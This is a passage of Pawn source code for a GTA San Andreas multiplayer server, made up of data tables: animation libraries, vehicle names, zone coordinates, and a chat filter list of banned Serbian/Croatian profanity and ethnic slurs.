	"CASINO",       "CHAINSAW",     "CHOPPA",       "CLOTHES",      "COACH",
	"COLT45",       "COP_AMBIENT",  "COP_DVBYZ",    "CRACK",        "CRIB",
	"DAM_JUMP",     "DANCING",      "DEALER",       "DILDO",        "DODGE",
	"DOZER",        "DRIVEBYS",     "FAT",          "FIGHT_B",      "FIGHT_C",
	"FIGHT_D",      "FIGHT_E",      "FINALE",       "FINALE2",      "FLAME",
	"FLOWERS",      "FOOD",         "FREEWEIGHTS",  "GANGS",        "GFUNK",
	"GHANDS",       "GHETTO_DB",    "GOGGLES",      "GRAFFITI",     "GRAVEYARD",
	"GRENADE",      "GYMNASIUM",    "HAIRCUTS",     "HEIST9",       "INT_HOUSE",
	"INT_OFFICE",   "INT_SHOP",     "JST_BUISNESS", "KART",         "KISSING",
	"KNIFE",        "LAPDAN1",      "LAPDAN2",      "LAPDAN3",      "LOWRIDER",
	"MD_CHASE",     "MD_END",       "MEDIC",        "MISC",         "MTB",
	"MUSCULAR",     "NEVADA",       "ON_LOOKERS",   "OTB",          "PARACHUTE",
	"PARK",         "PAULNMAC",     "PED",          "PLAYER_DVBYS", "PLAYIDLES",
	"POLICE",       "POOL",         "POOR",         "PYTHON",       "QUAD",
	"QUAD_DBZ",     "RAPPING",      "RIFLE",        "RIOT",         "ROB_BANK",
	"ROCKET",       "RUNNINGMAN",   "RUSTLER",      "RYDER",        "SCRATCHING",
	"SEX",          "SHAMAL",       "SHOP",         "SHOTGUN",      "SILENCED",
	"SKATE",        "SMOKING",      "SNIPER",       "SNM",          "SPRAYCAN",
	"STRIP",        "SUNBATHE",     "SWAT",         "SWEET",        "SWIM",
	"SWORD",        "TANK",         "TATTOOS",      "TEC",          "TRAIN",
	"TRUCK",        "UZI",          "VAN",          "VENDING",      "VORTEX",
	"WAYFARER",     "WEAPONS",      "WOP",          "WUZI"
};

new ZabranjeneReci[][] =
{
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
    "mater", "majka", "jebem", "kurac", "picka", "jebi",
    "govno", "govna", "retarde", "cetnicku", "ustasku",
    "balija", "cetnik", "ustasa",
    "ghetoven", "saco", "kico", "kristijan"
};

new ImeVozila[212][20] =
{
	"Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel",
	"Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus",
	"Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam",
	"Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BF Injection",
 	"Hunter", "Premier", "Enforcer", "Securicar", "Banshee", "Predator", "Bus",
  	"Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie",
   	"Stallion", "Rumpo", "RC Bandit", "Romero", "Packer", "Monster", "Admiral",
    "Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder",
    "Reefer", "Tropic", "Flatbed", "Yankee", "Caddy", "Solair", "Berkley's RC Van",
	"Skimmer", "PCJ-600", "Faggio", "Freeway", "RC Baron", "RC Raider", "Glendale",
	"Oceanic", "Sanchez", "Sparrow", "Patriot", "Quad", "Coastguard", "Dinghy",
	"Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX",
	"Burrito", "Camper", "Marquis", "Baggage", "Dozer", "Maverick", "News Chopper",
	"Rancher", "GOV Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking",
	"Blista Compact", "Police Maverick", "Boxvillde", "Benson", "Mesa", "RC Goblin",
	"Hotring Racer A", "Hotring Racer B", "Bloodring Banger", "Rancher", "Super GT",
	"Elegant", "Journey", "Bike", "Mountain Bike", "Beagle", "Cropduster", "Stunt",
	"Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra",
	"FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck", "Fortune",
	"Cadrona", "GOV Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer",
	"Remington", "Slamvan", "Blade", "Freight", "Streak", "Vortex", "Vincent",
	"Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo",
	"Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada", "Yosemite",
	"Windsor", "Monster", "Monster", "Uranus", "Jester", "Sultan", "Stratum",
	"Elegy", "Raindance", "RC Tiger", "Flash", "Tahoma", "Savanna", "Bandito",
	"Freight Flat", "Streak Carriage", "Kart", "Mower", "Dune", "Sweeper",
	"Broadway", "Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400",
	"News Van", "Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club",
	"Freight Box", "Trailer", "Andromada", "Dodo", "RC Cam", "Launch", "GOV Car",
	"GOV Car", "GOV Car", "GOV Ranger", "Picador", "S.W.A.T", "Alpha",
	"Phoenix", "Glendale", "Sadler", "Luggage", "Luggage", "Stairs", "Boxville",
	"Tiller", "Utility Trailer"
};

enum SAZONE_MAIN
{
	SAZONE_NAME[38],
	Float:SAZONE_AREA[6]
};
const MAX_ZONE_NAME = 38;
static const gSAZones[366][ SAZONE_MAIN ] = {
    {"The Big Ear",                    {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
    {"Aldea Malvada",                {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
    {"Angel Pine",                    {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
    {"Arco del Oeste",                {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
    {"Avispa Country Club",            {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
    {"Avispa Country Club",            {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
    {"Avispa Country Club",            {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
    {"Avispa Country Club",            {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
    {"Avispa Country Club",            {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
    {"Avispa Country Club",            {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
    {"Back o Beyond",                {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
    {"Battery Point",                {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
    {"Bayside",                        {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
    {"Bayside Marina",                {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
    {"Beacon Hill",                    {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
    {"Blackfield",                    {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
    {"Blackfield",                    {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
    {"Blackfield Chapel",            {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
    {"Blackfield Chapel",            {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
    {"Blackfield Intersection",        {1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
    {"Blackfield Intersection",        {1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
    {"Blackfield Intersection",        {1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
    {"Blackfield Intersection",        {1375.60,823.20,-89.00,1457.30,919.40,110.90}},
    {"Blueberry",                    {104.50,-220.10,2.30,349.60,152.20,200.00}},
    {"Blueberry",                    {19.60,-404.10,3.80,349.60,-220.10,200.00}},
    {"Blueberry Acres",                {-319.60,-220.10,0.00,104.50,293.30,200.00}},
    {"Caligulas Palace",            {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
    {"Caligulas Palace",            {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
    {"Calton Heights",                {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
    {"Chinatown",                    {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
    {"City Hall",                    {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
    {"Come-A-Lot",                    {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
    {"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
    {"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
    {"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
    {"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
    {"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
    {"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
    {"Conference Center",            {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
    {"Conference Center",            {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
    {"Cranberry Station",            {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
    {"Creek",                        {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
    {"Dillimore",                    {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
    {"Doherty",                        {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
    {"Doherty",                        {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
    {"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
    {"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
    {"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
    {"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
    {"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
    {"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
    {"Downtown Los Santos",            {1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
    {"Downtown Los Santos",            {1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
    {"Downtown Los Santos",            {1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
    {"Downtown Los Santos",            {1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
    {"Downtown Los Santos",            {1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
    {"Downtown Los Santos",            {1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
    {"Downtown Los Santos",            {1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
    {"Downtown Los Santos",            {1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
    {"Downtown Los Santos",            {1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
    {"East Beach",                    {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
    {"East Beach",                    {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
    {"East Beach",                    {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
    {"East Beach",                    {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
    {"East Los Santos",                {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
    {"East Los Santos",                {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
    {"East Los Santos",                {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
    {"East Los Santos",                {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
    {"East Los Santos",                {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
    {"East Los Santos",                {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
    {"East Los Santos",                {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
    {"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
    {"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
    {"Easter Bay Airport",            {-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
    {"Easter Bay Airport",            {-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
    {"Easter Bay Airport",            {-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
    {"Easter Bay Airport",            {-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
    {"Easter Bay Airport",            {-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
    {"Easter Bay Airport",            {-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
    {"Easter Bay Airport",            {-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
    {"Easter Bay Airport",            {-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
    {"Easter Bay Chemicals",        {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
    {"Easter Bay Chemicals",        {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
    {"El Castillo del Diablo",        {-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
    {"El Castillo del Diablo",        {-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
    {"El Castillo del Diablo",        {-208.50,2337.10,0.00,8.40,2487.10,200.00}},
    {"El Corona",                    {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
    {"El Corona",                    {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
    {"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
    {"Esplanade East",                {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
    {"Esplanade East",                {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
    {"Esplanade East",                {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
    {"Esplanade North",                {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
    {"Esplanade North",                {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
    {"Esplanade North",                {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
    {"Fallen Tree",                    {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
    {"Fallow Bridge",                {434.30,366.50,0.00,603.00,555.60,200.00}},
    {"Fern Ridge",                    {508.10,-139.20,0.00,1306.60,119.50,200.00}},
    {"Financial",                    {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
    {"Fishers Lagoon",                {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
    {"Flint Intersection",            {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
    {"Flint Range",                    {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
    {"Fort Carson",                    {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
    {"Foster Valley",                {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
    {"Foster Valley",                {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
    {"Foster Valley",                {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
    {"Foster Valley",                {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
    {"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
    {"Gant Bridge",                    {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
    {"Gant Bridge",                    {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
    {"Ganton",                        {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
    {"Ganton",                        {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
    {"Garcia",                        {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
    {"Garcia",                        {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
    {"Garver Bridge",                {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
    {"Garver Bridge",                {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
    {"Garver Bridge",                {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
    {"Glen Park",                    {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
    {"Glen Park",                    {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
    {"Glen Park",                    {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
    {"Green Palms",                    {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
    {"Greenglass College",            {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
    {"Greenglass College",            {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
    {"Hampton Barns",                {603.00,264.30,0.00,761.90,366.50,200.00}},
    {"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
    {"Harry Gold Parkway",            {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
    {"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
    {"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
    {"Hunter Quarry",                {337.20,710.80,-115.20,860.50,1031.70,203.70}},
    {"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
    {"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
    {"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
    {"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
    {"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
    {"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
    {"Jefferson",                    {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
    {"Jefferson",                    {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
    {"Jefferson",                    {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
    {"Jefferson",                    {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
    {"Jefferson",                    {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
    {"Jefferson",                    {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
    {"Julius Thruway East",            {2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
    {"Julius Thruway East",            {2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
    {"Julius Thruway East",            {2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
    {"Julius Thruway East",            {2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
    {"Julius Thruway North",        {2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
    {"Julius Thruway North",        {2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
    {"Julius Thruway North",        {2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
    {"Julius Thruway North",        {1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
    {"Julius Thruway North",        {1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
    {"Julius Thruway North",        {1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
    {"Julius Thruway North",        {1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
    {"Julius Thruway North",        {1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
    {"Julius Thruway South",        {1457.30,823.20,-89.00,2377.30,863.20,110.90}},
    {"Julius Thruway South",        {2377.30,788.80,-89.00,2537.30,897.90,110.90}},
    {"Julius Thruway West",            {1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
    {"Julius Thruway West",            {1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
    {"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
    {"Juniper Hollow",                {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
    {"K.A.C.C. Military Fuels",        {2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
    {"Kincaid Bridge",                {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
    {"Kincaid Bridge",                {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
    {"Kincaid Bridge",                {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
    {"Kings",                        {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
    {"Kings",                        {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
    {"Kings",                        {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
    {"LVA Freight Depot",            {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
    {"LVA Freight Depot",            {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
    {"LVA Freight Depot",            {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
    {"LVA Freight Depot",            {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
    {"LVA Freight Depot",            {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
    {"Las Barrancas",                {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
    {"Las Brujas",                    {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
    {"Las Colinas",                    {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
    {"Las Colinas",                    {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
    {"Las Colinas",                    {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
    {"Las Colinas",                    {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
    {"Las Colinas",                    {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
    {"Las Colinas",                    {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
    {"Las Colinas",                    {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
    {"Las Payasadas",                {-354.30,2580.30,2.00,-133.60,2816.80,200.00}},
    {"Las Venturas Airport",        {1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
    {"Las Venturas Airport",        {1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
    {"Las Venturas Airport",        {1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
    {"Las Venturas Airport",        {1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
    {"Last Dime Motel",                {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
    {"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
    {"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
    {"Lil' Probe Inn",                {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
    {"Linden Side",                    {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
    {"Linden Station",                {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
    {"Linden Station",                {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
    {"Little Mexico",                {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
    {"Little Mexico",                {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
    {"Los Flores",                    {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
    {"Los Flores",                    {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
    {"Los Santos International",    {1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
    {"Los Santos International",    {1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
    {"Los Santos International",    {1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
    {"Los Santos International",    {1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
    {"Los Santos International",    {1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
    {"Los Santos International",    {2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
    {"Marina",                        {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
    {"Marina",                        {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
    {"Marina",                        {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
    {"Market",                        {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
    {"Market",                        {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
    {"Market",                        {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
    {"Market",                        {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
    {"Market Station",                {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
    {"Martin Bridge",                {-222.10,293.30,0.00,-122.10,476.40,200.00}},
    {"Missionary Hill",                {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
    {"Montgomery",                    {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
    {"Montgomery",                    {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
    {"Montgomery Intersection",        {1546.60,208.10,0.00,1745.80,347.40,200.00}},
    {"Montgomery Intersection",        {1582.40,347.40,0.00,1664.60,401.70,200.00}},
    {"Mulholland",                    {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
    {"Mulholland",                    {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
    {"Mulholland",                    {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
    {"Mulholland",                    {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
    {"Mulholland",                    {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
    {"Mulholland",                    {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
    {"Mulholland",                    {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
    {"Mulholland",                    {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
    {"Mulholland",                    {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
    {"Mulholland",                    {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
    {"Mulholland",                    {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
    {"Mulholland",                    {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
    {"Mulholland",                    {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
    {"Mulholland Intersection",        {1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
    {"North Rock",                    {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
    {"Ocean Docks",                    {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
    {"Ocean Docks",                    {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
    {"Ocean Docks",                    {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
    {"Ocean Docks",                    {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
    {"Ocean Docks",                    {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
    {"Ocean Docks",                    {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
    {"Ocean Docks",                    {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
    {"Ocean Flats",                    {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
    {"Ocean Flats",                    {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
    {"Ocean Flats",                    {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
    {"Octane Springs",                {338.60,1228.50,0.00,664.30,1655.00,200.00}},
    {"Old Venturas Strip",            {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
    {"Palisades",                    {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
    {"Palomino Creek",                {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
    {"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
    {"Pershing Square",                {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
    {"Pilgrim",                        {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
    {"Pilgrim",                        {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
    {"Pilson Intersection",            {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
    {"Pirates in Mens Pants",        {1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
    {"Playa del Seville",            {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
    {"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
    {"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
    {"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
    {"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
    {"Queens",                        {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
    {"Queens",                        {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
    {"Queens",                        {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
    {"Randolph Industrial",            {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
    {"Redsands East",                {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
    {"Redsands East",                {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
    {"Redsands East",                {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
    {"Redsands West",                {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
    {"Redsands West",                {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
    {"Redsands West",                {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
    {"Redsands West",                {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
    {"Regular Tom",                    {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
    {"Richman",                        {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
    {"Richman",                        {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
    {"Richman",                        {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
    {"Richman",                        {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
    {"Richman",                        {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
    {"Richman",                        {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
    {"Richman",                        {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
    {"Richman",                        {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
    {"Richman",                        {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
    {"Richman",                        {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
    {"Robada Intersection",            {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
    {"Roca Escalante",                {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
